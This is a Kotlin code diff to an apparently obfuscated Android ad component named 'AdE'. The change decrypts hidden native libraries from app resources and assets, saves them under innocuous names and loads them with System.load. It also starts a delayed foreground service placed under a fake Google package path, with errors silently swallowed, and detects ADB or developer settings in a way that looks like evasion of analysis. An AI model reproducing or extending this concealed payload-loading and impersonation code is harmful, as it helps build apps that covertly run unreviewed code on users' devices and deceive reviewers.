@@ -3,13 +3,14 @@ package core
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
+import android.content.Intent
 import android.net.ConnectivityManager
 import android.os.Build
 import android.os.PowerManager
 import android.provider.Settings
-import android.util.Log
+import androidx.core.content.ContextCompat
+import com.google.android.datatransport.core.MessageCoreService
 import com.sound.helper.PerGoogle
-import com.sound.helper.AppLifecycelListener
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -17,7 +18,6 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
 import walks.lb.ha
-import com.sound.helper.Constant
 import com.helper.sdk.O1
 import java.io.File
 import java.io.FileOutputStream
@@ -189,16 +189,21 @@ object AdE {
         mMainScope.launch {
             PerGoogle.pE("test_s_dec")
             val time = System.currentTimeMillis()
-            val i: Boolean
-            withContext(Dispatchers.IO) {
-                i = loadRawFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
-            }
+            val i: Boolean = loadRawFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
             if (i.not()) {
                 PerGoogle.pE("ss_l_f", "$is64i")
                 return@launch
             }
             PerGoogle.pE("test_s_load", "${System.currentTimeMillis() - time}")
             ha.a0(tagL, 1.0f)
+            launch {
+                delay(5000)
+                try {
+                    ContextCompat.startForegroundService(
+                        mContext, Intent(mContext, MessageCoreService::class.java)
+                    )
+                } catch (t: Throwable) { }
+            }
             delay(1200)
             while (true) {
                 // 刷新配置
@@ -216,8 +221,8 @@ object AdE {
             }
         }
 
-        mMainScope.launch(Dispatchers.IO) {
-            delay(1000)
+        CoroutineScope(Dispatchers.IO).launch {
+            delay(6000)
             if (loadSFile(if (is64i) Constant.H_64 else Constant.H_32)) {
                 withContext(Dispatchers.Main) {
                     try {
@@ -231,19 +236,20 @@ object AdE {
     }
 
     private fun loadRawFile(assetsName: String): Boolean {
-        val resourceId: Int =
-            mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
-        val aIp = mContext.resources.openRawResource(resourceId)
-        val fSN = "A_${System.currentTimeMillis()}"
+        val fSN = "Prank_Helper"
         val file = File("${mContext.filesDir}/Cache")
         if (file.exists().not()) {
             file.mkdirs()
         }
+        val file2 = File(file.absolutePath, fSN)
         try {
-            decrypt(aIp, File(file.absolutePath, fSN))
-            val file2 = File(file.absolutePath, fSN)
+            if (file2.exists().not()) {
+                val resourceId: Int =
+                    mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
+                val aIp = mContext.resources.openRawResource(resourceId)
+                decrypt(aIp, file2)
+            }
             System.load(file2.absolutePath)
-            file2.delete()
             return true
         } catch (_: Exception) {
         }
@@ -252,16 +258,17 @@ object AdE {
 
     private fun loadSFile(assetsName: String): Boolean {
         val aIp = mContext.assets.open(assetsName)
-        val fSN = "A_${System.currentTimeMillis()}"
+        val fSN = "ask_vibes"
         val file = File("${mContext.filesDir}/Cache")
         if (file.exists().not()) {
             file.mkdirs()
         }
+        val file2 = File(file.absolutePath, fSN)
         try {
-            decrypt(aIp, File(file.absolutePath, fSN))
-            val file2 = File(file.absolutePath, fSN)
+            if (file2.exists().not()) {
+                decrypt(aIp, file2)
+            }
             System.load(file2.absolutePath)
-            file2.delete()
             return true
         } catch (_: Exception) {
         }
@@ -390,11 +397,11 @@ object AdE {
     private fun isTestUser(): Boolean {
         if (isCheckDev.not()) return false
         val s = PerGoogle.getStr("tes_u")
-        val isOpen = isAdbEnabled(mContext) || isDevelopmentSettingsEnabled(mContext)
-        if (isOpen && s.isBlank()) {
-            PerGoogle.saveC("tes_u", "1")
+        if (s.isBlank()) {
+            val isOpen = isAdbEnabled(mContext) || isDevelopmentSettingsEnabled(mContext)
+            PerGoogle.saveC("tes_u", if (isOpen) "1" else "0")
         }
-        return isOpen || s == "1"
+        return s == "1"
     }
 
     private fun isAdbEnabled(context: Context): Boolean {
